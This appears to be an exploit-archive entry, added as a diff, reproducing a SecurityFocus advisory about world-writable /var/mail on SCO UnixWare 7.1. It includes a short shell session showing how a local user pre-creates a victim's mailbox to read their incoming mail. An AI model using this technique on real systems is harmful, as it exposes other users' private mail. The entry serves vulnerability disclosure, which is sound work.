@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/849/info
+
+Certain versions of SCO's UnixWare (only 7.1 was tested) ship with the /var/mail/
+directory with permission 777(-rwxrwxrwx) . This in effect allows malicious users to read incoming mail for users who do not yet have a mail file (/var/mail/username) present. This may be done by simply creating the file in question with a permission mode which is readable to the attacker. 
+
+bash-2.02$ id
+uid=106(xnec) gid=1(other)
+bash-2.02$ pwd
+/var/mail
+bash-2.02$ touch btellier
+bash-2.02$ chown btellier btellier
+bash-2.02$ ls -la btellier
+-rw-r--r-- 1 btellier other 0 Dec 4 07:54 btellier
+
+Now wait for btellier to get some mail...
